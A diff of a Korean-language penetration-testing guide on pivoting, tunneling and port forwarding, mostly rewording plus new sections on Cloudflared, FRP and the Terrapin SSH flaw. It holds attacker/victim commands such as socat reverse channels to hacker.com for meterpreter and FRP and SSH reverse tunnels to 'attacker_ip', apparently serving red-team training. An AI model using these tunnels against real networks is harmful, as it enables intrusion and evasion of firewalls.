@@ -5,7 +5,7 @@
 ## Nmap tip
 
 > [!WARNING]
-> **ICMP** 및 **SYN** 스캔은 socks 프록시를 통해 터널링할 수 없으므로 **ping 탐지**를 **비활성화**해야 합니다 (`-Pn`) 그리고 **TCP 스캔**(`-sT`)을 지정해야 합니다.
+> **ICMP** 및 **SYN** 스캔은 socks 프록시를 통해 터널링할 수 없으므로 **ping 탐지**를 **비활성화**해야 하며 (`-Pn`) **TCP 스캔**(`-sT`)을 지정해야 합니다.
 
 ## **Bash**
 
@@ -87,9 +87,13 @@ iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
+> [!NOTE]
+> **보안 – 테라핀 공격 (CVE-2023-48795)**
+> 2023 테라핀 다운그레이드 공격은 중간자 공격자가 초기 SSH 핸드셰이크를 조작하고 **모든 포워딩 채널** ( `-L`, `-R`, `-D` )에 데이터를 주입할 수 있게 합니다. 클라이언트와 서버 모두 패치되었는지 확인하세요 (**OpenSSH ≥ 9.6/LibreSSH 6.7**) 또는 SSH 터널에 의존하기 전에 취약한 `chacha20-poly1305@openssh.com` 및 `*-etm@openssh.com` 알고리즘을 `sshd_config`/`ssh_config`에서 명시적으로 비활성화하세요. citeturn4search0
+
 ## SSHUTTLE
 
-당신은 **ssh**를 통해 호스트를 통해 **서브네트워크**로 모든 **트래픽**을 **터널링**할 수 있습니다.\
+호스트를 통해 **서브네트워크**로 모든 **트래픽**을 **ssh**를 통해 **터널링**할 수 있습니다.\
 예를 들어, 10.10.10.0/24로 가는 모든 트래픽을 포워딩합니다.
 ```bash
 pip install sshuttle
@@ -132,9 +136,9 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
 ## Cobalt Strike
 
-### SOCKS proxy
+### SOCKS 프록시
 
-팀 서버에서 모든 인터페이스에서 수신 대기하는 포트를 열어 **비콘을 통해 트래픽을 라우팅**하는 데 사용할 수 있습니다.
+모든 인터페이스에서 수신 대기하는 팀 서버에서 포트를 열어 **비콘을 통해 트래픽을 라우팅**하는 데 사용할 수 있습니다.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -174,8 +178,8 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ```
 ## Chisel
 
-You can download it from the releases page of [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-**클라이언트와 서버에 대해 동일한 버전을 사용해야 합니다.**
+[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)의 릴리스 페이지에서 다운로드할 수 있습니다.\
+클라이언트와 서버에 **같은 버전**을 사용해야 합니다.
 
 ### socks
 ```bash
@@ -286,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-이 줄을 희생자의 콘솔에서 마지막 줄 대신 실행하면 **비인증 프록시**를 우회할 수 있습니다:
+비인증 프록시를 우회하려면 피해자의 콘솔에서 마지막 줄 대신 이 줄을 실행할 수 있습니다:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -331,7 +335,7 @@ echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0
 
 ### Port2Port
 
-로컬 관리자여야 합니다 (모든 포트에 대해)
+로컬 관리자가 되어야 합니다 (모든 포트에 대해)
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
 # Example:
@@ -343,10 +347,10 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-**시스템에 대한 RDP 액세스가 필요합니다.**\
+**RDP 액세스가 시스템에 필요합니다.**\
 다운로드:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 이 도구는 Windows의 원격 데스크톱 서비스 기능에서 `Dynamic Virtual Channels` (`DVC`)를 사용합니다. DVC는 **RDP 연결을 통한 패킷 터널링**을 담당합니다.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 이 도구는 Windows의 원격 데스크톱 서비스 기능에서 `Dynamic Virtual Channels` (`DVC`)를 사용합니다. DVC는 **RDP 연결을 통해 패킷을 터널링하는 역할**을 합니다.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 클라이언트 컴퓨터에서 **`SocksOverRDP-Plugin.dll`**을 다음과 같이 로드합니다:
@@ -383,7 +387,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-프록시에 대해 인증하고 외부 서비스에 지정한 포트에 로컬로 바인딩합니다. 그런 다음 이 포트를 통해 원하는 도구를 사용할 수 있습니다.\
+프록시에 대해 인증하고 지정한 외부 서비스로 포트를 로컬에서 바인딩합니다. 그런 다음 이 포트를 통해 원하는 도구를 사용할 수 있습니다.\
 예를 들어 포트 443을 포워딩합니다.
 ```
 Username Alice
@@ -405,13 +409,13 @@ Microsoft에서 만든 리버스 프록시입니다. 여기에서 찾을 수 있
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-두 시스템 모두에서 루트 권한이 필요하여 tun 어댑터를 생성하고 DNS 쿼리를 사용하여 데이터 터널링을 수행합니다.
+두 시스템 모두에서 루트 권한이 필요하며, DNS 쿼리를 사용하여 tun 어댑터를 생성하고 데이터 터널링을 수행합니다.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-터널은 매우 느릴 것입니다. 이 터널을 통해 압축된 SSH 연결을 생성하려면 다음을 사용하십시오:
+터널은 매우 느릴 것입니다. 이 터널을 통해 압축된 SSH 연결을 생성할 수 있습니다:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -440,11 +444,11 @@ Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret som
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
-#### 프록시체인 DNS 변경
+#### Proxychains DNS 변경
 
-Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 SOCKS 프록시를 통해 터널링합니다. **기본적으로** proxychains가 사용하는 **DNS** 서버는 **4.2.2.2**입니다(하드코딩됨). 이를 변경하려면 파일을 편집하십시오: _/usr/lib/proxychains3/proxyresolv_ 및 IP를 변경하십시오. **Windows 환경**에 있는 경우 **도메인 컨트롤러**의 IP를 설정할 수 있습니다.
+Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 socks 프록시를 통해 터널링합니다. **기본적으로** proxychains가 사용하는 **DNS** 서버는 **4.2.2.2**입니다 (하드코딩됨). 이를 변경하려면 파일을 편집하세요: _/usr/lib/proxychains3/proxyresolv_ 그리고 IP를 변경하세요. **Windows 환경**에 있는 경우 **도메인 컨트롤러**의 IP를 설정할 수 있습니다.
 
-## Go의 터널
+## Go에서의 터널
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
@@ -513,7 +517,7 @@ _필요한 경우 인증 및 TLS를 추가하는 것도 가능합니다._
 ```
 #### HTTP 호출 스니핑
 
-_XSS, SSRF, SSTI 등에 유용..._\
+_XSS, SSRF, SSTI 등에 유용 ..._\
 stdout 또는 HTTP 인터페이스에서 직접 [http://127.0.0.1:4040](http://127.0.0.1:4000)에서.
 
 #### 내부 HTTP 서비스 터널링
@@ -541,7 +545,72 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
-## 다른 도구 확인하기
+## Cloudflared (Cloudflare Tunnel)
+
+Cloudflare의 `cloudflared` 데몬은 **로컬 TCP/UDP 서비스**를 노출하는 아웃바운드 터널을 생성할 수 있으며, 이를 위해 인바운드 방화벽 규칙이 필요하지 않습니다. Cloudflare의 엣지를 만남의 지점으로 사용합니다. 이는 이그레스 방화벽이 HTTPS 트래픽만 허용하고 인바운드 연결이 차단될 때 매우 유용합니다.
+
+### Quick tunnel one-liner
+```bash
+# Expose a local web service listening on 8080
+cloudflared tunnel --url http://localhost:8080
+# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
+```
+### SOCKS5 피벗
+```bash
+# Turn the tunnel into a SOCKS5 proxy on port 1080
+cloudflared tunnel --url socks5://localhost:1080 --socks5
+# Now configure proxychains to use 127.0.0.1:1080
+```
+### DNS를 이용한 지속적인 터널
+```bash
+cloudflared tunnel create mytunnel
+cloudflared tunnel route dns mytunnel internal.example.com
+# config.yml
+Tunnel: <TUNNEL-UUID>
+credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
+url: http://127.0.0.1:8000
+```
+커넥터 시작:
+```bash
+cloudflared tunnel run mytunnel
+```
+모든 트래픽이 호스트에서 **443 포트를 통해 아웃바운드**로 나가기 때문에, Cloudflared 터널은 인그레스 ACL 또는 NAT 경계를 우회하는 간단한 방법입니다. 이진 파일은 일반적으로 권한이 상승된 상태로 실행되므로, 가능한 경우 컨테이너를 사용하거나 `--user` 플래그를 사용하세요. citeturn1search0
+
+## FRP (Fast Reverse Proxy)
+
+[`frp`](https://github.com/fatedier/frp)는 **TCP, UDP, HTTP/S, SOCKS 및 P2P NAT 홀 펀칭**을 지원하는 적극적으로 유지 관리되는 Go 리버스 프록시입니다. **v0.53.0 (2024년 5월)**부터는 **SSH 터널 게이트웨이**로 작동할 수 있어, 대상 호스트가 추가 이진 파일 없이 기본 OpenSSH 클라이언트만 사용하여 리버스 터널을 생성할 수 있습니다.
+
+### 클래식 리버스 TCP 터널
+```bash
+# Attacker / server
+./frps -c frps.toml            # listens on 0.0.0.0:7000
+
+# Victim
+./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000
+
+# frpc.toml
+serverAddr = "attacker_ip"
+serverPort = 7000
+
+[[proxies]]
+name       = "rdp"
+type       = "tcp"
+localIP    = "127.0.0.1"
+localPort  = 3389
+remotePort = 5000
+```
+### 새로운 SSH 게이트웨이 사용하기 (frpc 바이너리 없음)
+```bash
+# On frps (attacker)
+sshTunnelGateway.bindPort = 2200   # add to frps.toml
+./frps -c frps.toml
+
+# On victim (OpenSSH client only)
+ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
+```
+위 명령은 피해자의 포트 **8080**을 **attacker_ip:9000**으로 게시하며, 추가 도구를 배포하지 않고도 수행됩니다 – 이는 living-off-the-land 피벗에 이상적입니다. citeturn2search1
+
+## 확인할 다른 도구들
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
